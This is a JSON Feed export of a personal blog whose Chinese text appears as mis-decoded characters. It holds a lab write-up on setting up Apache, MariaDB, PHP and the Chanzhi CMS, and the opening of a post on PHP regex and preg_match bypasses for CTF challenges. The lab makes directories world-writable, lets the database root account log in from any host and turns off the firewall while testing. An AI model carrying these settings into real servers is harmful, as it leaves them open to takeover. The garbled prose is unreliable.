{
    "version": "https://jsonfeed.org/version/1",
    "title": "",
    "subtitle": "",
    "icon": "https://blog.xcu.icu/images/favicon.ico",
    "description": "ä¸€ä¸ªå¦„æƒ³å…¨æ ˆwebå°åºŸç‰©çš„åšå®¢",
    "home_page_url": "https://blog.xcu.icu",
    "items": [
        {
            "id": "https://blog.xcu.icu/2022/11/19/chanzhi%E6%90%AD%E5%BB%BA/",
            "url": "https://blog.xcu.icu/2022/11/19/chanzhi%E6%90%AD%E5%BB%BA/",
            "title": "WWWæœåŠ¡å™¨æ­å»ºCMS",
            "date_published": "2022-11-18T16:00:00.000Z",
            "content_html": "<h2 id=\"å®éªŒ4wwwæœåŠ¡å™¨é…ç½®\"><a class=\"anchor\" href=\"#å®éªŒ4wwwæœåŠ¡å™¨é…ç½®\">#</a> å®éªŒ 4ï¼šWWW æœåŠ¡å™¨é…ç½®</h2>\n<p><strong>å®éªŒç›®çš„</strong></p>\n<blockquote>\n<p>1ã€æŒæ¡ Apache æœåŠ¡çš„å®‰è£…ä¸å¯åŠ¨ã€‚</p>\n<p>2ã€æŒæ¡ Apache æœåŠ¡çš„ä¸»é…ç½®æ–‡ä»¶ã€‚</p>\n<p>3ã€æŒæ¡å„ç§ Apache æœåŠ¡å™¨çš„é…ç½®ã€‚</p>\n<p>4ã€å­¦ä¼šåˆ›å»º Web ç½‘ç«™å’Œè™šæ‹Ÿä¸»æœºã€‚</p>\n</blockquote>\n<h3 id=\"1å®éªŒè¦æ±‚\"><a class=\"anchor\" href=\"#1å®éªŒè¦æ±‚\">#</a> 1. å®éªŒè¦æ±‚</h3>\n<blockquote>\n<p>ä»»åŠ¡ 1ï¼šWWW æœåŠ¡å™¨åŸºæœ¬é…ç½® ï¼Œå®éªŒæ­¥éª¤å¯å‚è€ƒã€ŠWWW æœåŠ¡å™¨åŸºæœ¬é…ç½®.pdfã€‹æ–‡ä»¶ã€‚</p>\n<p>ä»»åŠ¡ 2ï¼šé…ç½® LAMP ç¯å¢ƒï¼Œå®éªŒæ­¥éª¤å¯å‚è€ƒã€Šå®‰è£…è‰çŸ¥ CMS.pdfã€‹æ–‡ä»¶ã€‚</p>\n<p>å…¶å®ƒï¼šç»“åˆå®éªŒ 3-1ï¼Œå·²ç»éƒ¨ç½²çš„ DNS æœåŠ¡å™¨ï¼Œå¯ä»¥æ­£å¸¸è§£æ WWW æœåŠ¡å™¨çš„åŸŸåã€‚</p>\n</blockquote>\n<h3 id=\"2å®éªŒè¿‡ç¨‹\"><a class=\"anchor\" href=\"#2å®éªŒè¿‡ç¨‹\">#</a> 2. å®éªŒè¿‡ç¨‹</h3>\n<h4 id=\"21-wwwæœåŠ¡å™¨é…ç½®\"><a class=\"anchor\" href=\"#21-wwwæœåŠ¡å™¨é…ç½®\">#</a> 2.1 WWW æœåŠ¡å™¨é…ç½®</h4>\n<h5 id=\"211-å®‰è£…apache\"><a class=\"anchor\" href=\"#211-å®‰è£…apache\">#</a> 2.1.1 å®‰è£… Apache</h5>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">yum install httpd httpd-devel<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>å®‰è£… Apache æœåŠ¡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119135615439.png\" alt=\"image-20221119135615439\" /></p>\n<h5 id=\"212-ä¸»é…ç½®æ–‡ä»¶ä¿®æ”¹\"><a class=\"anchor\" href=\"#212-ä¸»é…ç½®æ–‡ä»¶ä¿®æ”¹\">#</a> 2.1.2 ä¸»é…ç½®æ–‡ä»¶ä¿®æ”¹</h5>\n<p>å¤‡ä»½</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119135908607.png\" alt=\"image-20221119135908607\" /></p>\n<p>åˆ é™¤æ³¨é‡Š</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119140051324.png\" alt=\"image-20221119140051324\" /></p>\n<h5 id=\"213è®¿é—®æµ‹è¯•\"><a class=\"anchor\" href=\"#213è®¿é—®æµ‹è¯•\">#</a> 2.1.3 è®¿é—®æµ‹è¯•</h5>\n<p>å°†é˜²ç«å¢™å…³é—­ï¼Œè®¿é—®æˆåŠŸ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119140843844.png\" alt=\"image-20221119140843844\" /></p>\n<p>æ·»åŠ é˜²ç«å¢™è§„åˆ™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119141203394.png\" alt=\"image-20221119141203394\" /></p>\n<p>æ­£å¸¸è®¿é—®</p>\n<p>Linux å®¢æˆ·ç«¯ä¹Ÿå¯ä»¥æ­£å¸¸è®¿é—®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119141733799.png\" alt=\"image-20221119141733799\" /></p>\n<h5 id=\"214åˆ›å»ºä¸»é¡µæ–‡ä»¶\"><a class=\"anchor\" href=\"#214åˆ›å»ºä¸»é¡µæ–‡ä»¶\">#</a> 2.1.4 åˆ›å»ºä¸»é¡µæ–‡ä»¶</h5>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119142010197.png\" alt=\"image-20221119142010197\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119145251932.png\" alt=\"image-20221119145251932\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119145305673.png\" alt=\"image-20221119145305673\" /></p>\n<h5 id=\"215åˆ›å»ºå­ç›®å½•\"><a class=\"anchor\" href=\"#215åˆ›å»ºå­ç›®å½•\">#</a> 2.1.5 åˆ›å»ºå­ç›®å½•</h5>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119145603554.png\" alt=\"image-20221119145603554\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119145553919.png\" alt=\"image-20221119145553919\" /></p>\n<h5 id=\"216é…ç½®å’Œç®¡ç†è™šæ‹Ÿä¸»æœº\"><a class=\"anchor\" href=\"#216é…ç½®å’Œç®¡ç†è™šæ‹Ÿä¸»æœº\">#</a> 2.1.6 é…ç½®å’Œç®¡ç†è™šæ‹Ÿä¸»æœº</h5>\n<p>å¢åŠ å­é…ç½®æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119150451651.png\" alt=\"image-20221119150451651\" /></p>\n<p>é‡å¯æœåŠ¡æ·»åŠ æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119150831618.png\" alt=\"image-20221119150831618\" /></p>\n<p>é…ç½®æ­£å‘è§£ææ–‡ä»¶ï¼Œå¼€å¯æ³›åŸŸåè§£æ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119151351196.png\" alt=\"image-20221119151351196\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119151440492.png\" alt=\"image-20221119151440492\" /></p>\n<h5 id=\"217åŸºäºç«¯å£çš„è™šæ‹Ÿä¸»æœº\"><a class=\"anchor\" href=\"#217åŸºäºç«¯å£çš„è™šæ‹Ÿä¸»æœº\">#</a> 2.1.7 åŸºäºç«¯å£çš„è™šæ‹Ÿä¸»æœº</h5>\n<p>ä¸»é…ç½®æ–‡ä»¶ä¸­å¢åŠ ä¸‹é¢çš„å†…å®¹</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119152256564.png\" alt=\"image-20221119152256564\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119152903072.png\" alt=\"image-20221119152903072\" /></p>\n<p>æ‹’ç»è®¿é—®</p>\n<p>ä¸»é…ç½®æ–‡ä»¶åŠ ä¸Šä¸€æ¡</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">Listen 192.168.9.148:8080<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119153036168.png\" alt=\"image-20221119153036168\" /></p>\n<h5 id=\"218è™šæ‹Ÿç›®å½•\"><a class=\"anchor\" href=\"#218è™šæ‹Ÿç›®å½•\">#</a> 2.1.8 è™šæ‹Ÿç›®å½•</h5>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119153247850.png\" alt=\"image-20221119153247850\" /></p>\n<p>ä¿®æ”¹ä¸»é…ç½®æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119153438412.png\" alt=\"image-20221119153438412\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119153524691.png\" alt=\"image-20221119153524691\" /></p>\n<h4 id=\"22-é…ç½®lampç¯å¢ƒ\"><a class=\"anchor\" href=\"#22-é…ç½®lampç¯å¢ƒ\">#</a> 2.2 é…ç½® LAMP ç¯å¢ƒ</h4>\n<h5 id=\"221-å®‰è£…æ•°æ®åº“\"><a class=\"anchor\" href=\"#221-å®‰è£…æ•°æ®åº“\">#</a> 2.2.1 å®‰è£…æ•°æ®åº“</h5>\n<p>é€šè¿‡å‘½ä»¤å®‰è£… mariadb æ•°æ®åº“</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">yum install mariadb mariadb-server mariadb-devel -y<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119153905541.png\" alt=\"image-20221119153905541\" /></p>\n<p>å¯åŠ¨æ•°æ®åº“</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119153957214.png\" alt=\"image-20221119153957214\" /></p>\n<h5 id=\"222-å®‰è£…php\"><a class=\"anchor\" href=\"#222-å®‰è£…php\">#</a> 2.2.2 å®‰è£… PHP</h5>\n<p>é”®å…¥ä¸‹é¢çš„å‘½ä»¤</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">yum install -y php php-mysql php-devel -y<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119154322001.png\" alt=\"image-20221119154322001\" /></p>\n<p>phpinfo æµ‹è¯•</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119154509615.png\" alt=\"image-20221119154509615\" /></p>\n<p>å‘ç°æœªèƒ½è§£æ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119154918263.png\" alt=\"image-20221119154918263\" /></p>\n<p>å‘é…ç½®æ–‡ä»¶ä¸­åŠ å…¥ä¸Šé¢è¿™ä¸€å¥è¯</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119154947112.png\" alt=\"image-20221119154947112\" /></p>\n<h5 id=\"223ä¸Šä¼ ç¦…çŸ¥cms\"><a class=\"anchor\" href=\"#223ä¸Šä¼ ç¦…çŸ¥cms\">#</a> 2.2.3 ä¸Šä¼ ç¦…çŸ¥ CMS</h5>\n<p>è¿™é‡Œç”¨ winSCP ä¸Šä¼  chanzhi çš„ cms æ¡†æ¶</p>\n<p>ç„¶åæ›´æ”¹ä¸»é…ç½®æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119160455976.png\" alt=\"image-20221119160455976\" /></p>\n<p>æ›´æ”¹æ­£å‘è§£ææ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119160641662.png\" alt=\"image-20221119160641662\" /></p>\n<p>è®¿é—®ç›®æ ‡åŸŸå</p>\n<p>è¿™é‡Œå°†æ–‡ä»¶è§£å‹åæ”¾ä¸Šä¼ æ— æ³•æ­£å¸¸è®¿é—®ï¼Œä¸Šä¼ æ•´ä¸ªå‹ç¼©åŒ…ä¹‹åå†è§£å‹</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">http:&#x2F;&#x2F;chanzhi.lq.co&#x2F;install.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119161331178.png\" alt=\"image-20221119161331178\" /></p>\n<p>åœ¨ç³»ç»Ÿæ£€æŸ¥å‘ç°æŠ¥é”™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119161417309.png\" alt=\"image-20221119161417309\" /></p>\n<p>è¿™é‡Œå…³é—­ SElinu ä¹Ÿæ²¡ç”¨ï¼ŒæŒ‰ç…§æç¤ºè¿è¡Œå‘½ä»¤ï¼Œç»™ tmp ä¸€ä¸ª 7 çš„æƒé™ï¼Œä¿®æ”¹å®‰å…¨ä¸Šä¸‹æ–‡</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">chcon -t httpd_sys_content_rw_tsystem -R\nchmod o&#x3D;rwx -R &#x2F;var&#x2F;www&#x2F;chanzhi&#x2F;system&#x2F;tmp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>ç„¶åå°±å‰©ä¸‹ä¸€ä¸ªé”™è¯¯äº†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119162330760.png\" alt=\"image-20221119162330760\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">chmod o&#x3D;rwx -R &#x2F;var&#x2F;www&#x2F;chanzhi&#x2F;www&#x2F;data&#x2F;\nchcon -t httpd_sys_content_rw_t -R &#x2F;var&#x2F;www&#x2F;chanzhi&#x2F;www&#x2F;data&#x2F;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119162521444.png\" alt=\"image-20221119162521444\" /></p>\n<p>ç»§ç»­æ•°æ®é…ç½®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119162654055.png\" alt=\"image-20221119162654055\" /></p>\n<p>ä½†æ˜¯æ•°æ®åº“è¿æ¥å¤±è´¥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119162824635.png\" alt=\"image-20221119162824635\" /></p>\n<p>SELinux é™åˆ¶äº† httpd å¯¹å¤–è®¿é—®çš„æƒé™ã€‚</p>\n<p>å¼€å¯ httpd_can_network_connect å’Œ httpd_can_network_connect_db</p>\n<p><pre class=\"line-numbers language-linux\" data-language=\"linux\"><code class=\"language-linux\">[root@localhost chanzhi]# setsebool -P httpd_can_network_connect on\n[root@localhost chanzhi]# setsebool -P httpd_can_network_connect_db on\n[root@localhost chanzhi]# semanage boolean -l |grep httpd_can\nhttpd_can_network_relay        (å…³    ,    å…³)  Allow httpd to can network relay\nhttpd_can_connect_mythtv       (å…³    ,    å…³)  Allow httpd to can connect mythtv\nhttpd_can_network_connect_db   (å¼€    ,    å¼€)  Allow httpd to can network connect db\nhttpd_can_network_connect      (å¼€    ,    å¼€)  Allow httpd to can network connect\nhttpd_can_connect_ftp          (å…³    ,    å…³)  Allow httpd to can connect ftp\nhttpd_can_connect_zabbix       (å…³    ,    å…³)  Allow httpd to can connect zabbix\nhttpd_can_sendmail             (å…³    ,    å…³)  Allow httpd to can sendmail\nhttpd_can_connect_ldap         (å…³    ,    å…³)  Allow httpd to can connect ldap\nhttpd_can_check_spam           (å…³    ,    å…³)  Allow httpd to can check spam\nhttpd_can_network_memcache     (å…³    ,    å…³)  Allow httpd to can network memcache\nhttpd_can_network_connect_cobbler (å…³    ,    å…³)  Allow httpd to can network connect cobbler\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>æ–°æŠ¥é”™æ¥äº†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119163116420.png\" alt=\"image-20221119163116420\" /></p>\n<p>å½“æ—¶æ•°æ®åº“é…ç½®çš„æ—¶å€™è®¾ç½®äº†ä¸å…è®¸è¿œç¨‹ç™»å½•</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">MariaDB [(none)]&gt; use mysql;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [mysql]&gt; update user set host&#x3D;&#39;%&#39; where user&#x3D;&#39;root&#39; and host&#x3D;&#39;localhost&#39;;\nQuery OK, 1 row affected (0.00 sec)\nRows matched: 1  Changed: 1  Warnings: 0\n\nMariaDB [mysql]&gt; select host,user from user;\n+-----------+------+\n| host      | user |\n+-----------+------+\n| %         | root |\n| 127.0.0.1 | root |\n| ::1       | root |\n+-----------+------+\n3 rows in set (0.00 sec)\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åé‡å¯æ•°æ®åº“</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119163623743.png\" alt=\"image-20221119163623743\" /></p>\n<p>å†™å…¥é…ç½®æ–‡ä»¶å¤±è´¥ï¼Œæ‰‹åŠ¨å†™å…¥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119163749252.png\" alt=\"image-20221119163749252\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119163827222.png\" alt=\"image-20221119163827222\" /></p>\n<h4 id=\"23å®éªŒè¡¥å……\"><a class=\"anchor\" href=\"#23å®éªŒè¡¥å……\">#</a> 2.3 å®éªŒè¡¥å……</h4>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">https:&#x2F;&#x2F;www.zsite.com&#x2F;download&#x2F;422.html<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>ä¸Šé¢çš„ç‰ˆæœ¬è§†ä¹ä¸å…¨ï¼Œå»å®‰è£…ä¸€ä¸ªæ–°çš„ï¼Œå‰é¢çš„å†…å®¹ä¸å˜ï¼Œä¸Šä¼  chanzhi åè®¿é—®</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119170049451.png\" alt=\"image-20221119170049451\" /></p>\n<p>è¿˜æ˜¯è€æŠ¥é”™</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119170256805.png\" alt=\"image-20221119170256805\" /></p>\n<p>æ›´æ”¹å®‰å…¨ä¸Šä¸‹æ–‡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119170643476.png\" alt=\"image-20221119170643476\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119170921159.png\" alt=\"image-20221119170921159\" /></p>\n<p>æŠ¥é”™æœªå®‰è£…å‘å¯¼</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119171002000.png\" alt=\"image-20221119171002000\" /></p>\n<p>ç‚¹å‡»è·³è½¬è¿æ¥ï¼Œå®‰è£…ä¸‹é¢çš„èµ„æº</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119171113097.png\" alt=\"image-20221119171113097\" /></p>\n<p>å°†ä¸‹è½½åçš„æ–‡ä»¶æ”¾åˆ° cahnzhi çš„è·Ÿç›®å½•ä¸­è®¿é—®è¿™ä¸ªæ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119171852755.png\" alt=\"image-20221119171852755\" /></p>\n<p>ä¼šè·³è½¬åˆ°å®‰è£…ä¸€ä¸ªå‘å¯¼é¡µé¢</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb3dubG9hZHMuaW9uY3ViZS5jb20vbG9hZGVyX2Rvd25sb2Fkcy9pb25jdWJlX2xvYWRlcnNfbGluX3g4Ni02NC56aXA=\">https://downloads.ioncube.com/loader_downloads/ioncube_loaders_lin_x86-64.zip</span></p>\n<p>å°†ä¸Šé¢çš„æ–‡ä»¶ä¸‹è½½åè§£å‹åˆ° /usr/lib64/php/modules</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119172651412.png\" alt=\"image-20221119172651412\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2NoYW56aGkubHEuY28vbG9hZGVyLXdpemFyZC5waHA/dGltZW91dD0wJmFtcDtpbmk9MCZhbXA7cGFnZT1waHBjb25maWcmYW1wO2Rvd25sb2FkPTEmYW1wO25ld2xpbmVzb25seT0xJmFtcDtpbmluYW1lPTAwLWlvbmN1YmUuaW5pJmFtcDtzdHlwZT1s\">http://chanzhi.lq.co/loader-wizard.php?timeout=0&amp;ini=0&amp;page=phpconfig&amp;download=1&amp;newlinesonly=1&amp;ininame=00-ioncube.ini&amp;stype=l</span></p>\n<p>å°†ä¸Šé¢çš„ ini æ–‡ä»¶æ”¾åˆ° /etc/php.d</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119172515908.png\" alt=\"image-20221119172515908\" /></p>\n<p>é‡å¯ apache æœåŠ¡ï¼Œç‚¹å‡»æµ‹è¯•</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119172829181.png\" alt=\"image-20221119172829181\" /></p>\n<p>å†æ¬¡è®¿é—® chanzhi é¦–é¡µ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221119172937827.png\" alt=\"image-20221119172937827\" /></p>\n",
            "tags": [
                "ç½‘ç»œæœåŠ¡åº”ç”¨",
                "WWWæœåŠ¡å™¨"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/",
            "url": "https://blog.xcu.icu/2022/11/09/preg_match&&%E6%AD%A3%E5%88%99/",
            "title": "preg_match&&æ­£åˆ™",
            "date_published": "2022-11-08T16:00:00.000Z",
            "content_html": "<h3 id=\"å‰è¨€\"><a class=\"anchor\" href=\"#å‰è¨€\">#</a> å‰è¨€</h3>\n<p>æœ¬ç¯‡ä¸»è¦ç”¨äºè®°å½•æ­£åˆ™è¡¨è¾¾å¼å’Œ preg_match å‡½æ•°çš„ç»•è¿‡</p>\n<h3 id=\"preg_matchå‡½æ•°\"><a class=\"anchor\" href=\"#preg_matchå‡½æ•°\">#</a> preg_match å‡½æ•°</h3>\n<p>è¿™ä¸ªå‡½æ•°å¯ä»¥ç”¨æ¥è¿›è¡Œå­—ç¬¦ä¸²è§„åˆ™çš„åŒ¹é…ï¼Œè¿™ä¸ªå‡½æ•°ä¹Ÿæ˜¯åœ¨ ctf ä¸­ç»å¸¸ä¼šé‡åˆ°çš„ä¸€ä¸ªå‡½æ•°</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">preg_match</span> <span class=\"token punctuation\">(</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$pattern</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword type-hint\">string</span> <span class=\"token variable\">$subject</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span> <span class=\"token keyword type-declaration\">array</span> <span class=\"token operator\">&amp;</span><span class=\"token variable\">$matches</span>  <span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>preg_match_all () - æ‰§è¡Œä¸€ä¸ªå…¨å±€æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…</p>\n<ul>\n<li>$pattern æ˜¯åŒ¹é…è§„åˆ™</li>\n<li>$subjec æ˜¯è¢«åŒ¹é…çš„å­—ç¬¦ä¸²</li>\n<li>$matches æä¾›ä¸€ä¸ªå­˜æ”¾åŒ¹é…ç»“æœçš„æ•°ç»„</li>\n</ul>\n<p>demo:</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"hello php\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/php/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108192842127.png\" alt=\"image-20221108192842127\" /></p>\n<h3 id=\"æ­£åˆ™è¡¨è¾¾å¼\"><a class=\"anchor\" href=\"#æ­£åˆ™è¡¨è¾¾å¼\">#</a> æ­£åˆ™è¡¨è¾¾å¼</h3>\n<p>ç®€å•çš„ä½¿ç”¨æ–¹æ³•ï¼Œæ¥ä¸‹æ¥å¼€å§‹èŠæ­£åˆ™è¡¨è¾¾å¼ï¼Œæˆ–è®¸ä½ æ²¡å†™è¿‡ï¼Œä½†æ˜¯ä½ è‚¯å®šç”¨è¿‡ç±»ä¼¼çš„æ­£åˆ™ï¼Œå¿…ç„¶ Linux ä¸­çš„ï¼Ÿ* åŒ¹é…å­—ç¬¦ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯æ— èŠçš„è®°å¿†çš„çŸ¥è¯†äº†</p>\n<p>æ¥ä¸€ä¸ªç®€å•çš„ä¾‹å­</p>\n<p><sup class=\"footnote-ref\"><a href=\"#fn1\" id=\"fnref1\">[1]</a></sup>+abc$</p>\n<ol>\n<li>^ æ˜¯åŒ¹é…è¾“å…¥å­—ç¬¦ä¸²çš„ä½ç½®</li>\n<li>[0-9]+ æ˜¯åŒ¹é…å¤šä¸ªæ•°å­—ï¼Œ[0-9] åŒ¹é…ä¸€ä¸ªæ•°å­—ï¼Œ+ æ˜¯åŒ¹é…ä¸€ä¸ªæˆ–è€…å¤šä¸ªã€‚</li>\n<li>abc åŒ¹é…å­—æ¯ abc å¹¶ä»¥ abc ç»“å°¾ï¼Œ$ ä¸ºåŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„ç»“æŸä½ç½®</li>\n</ol>\n<h3 id=\"è¯­æ³•\"><a class=\"anchor\" href=\"#è¯­æ³•\">#</a> è¯­æ³•</h3>\n<p>é¦–å…ˆçœ‹ä¸€çœ‹æˆ‘ä»¬å¸¸ç”¨åˆ°çš„å‡ ä¸ªåŒ¹é…ç¬¦å·</p>\n<ul>\n<li>\n<ul>\n<li></li>\n</ul>\n<p>æ¯”å¦‚è¯´ ph+pï¼Œè¿™é‡Œ + ä»£è¡¨å‰é¢çš„ h è‡³å°‘å‡ºç°ä¸€æ¬¡ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥åŒ¹é…åˆ° phpã€phhpã€phhhp ç­‰ç­‰</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"pp php phhp phhhp\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">preg_match_all</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/ph+p/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>è¿™é‡Œçš„ preg_match_all å¯ä»¥åŒ¹é…åˆ°è¢«åŒ¹é…å­—ç¬¦ä¸²çš„æ‰€æœ‰ç¬¦åˆé¡¹ï¼Œè€Œ preg_match åŒ¹é…åˆ°ç¬¬ä¸€ä¸ªå°±ç»“æŸäº†</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221108200557709.png\" alt=\"image-20221108200557709\" 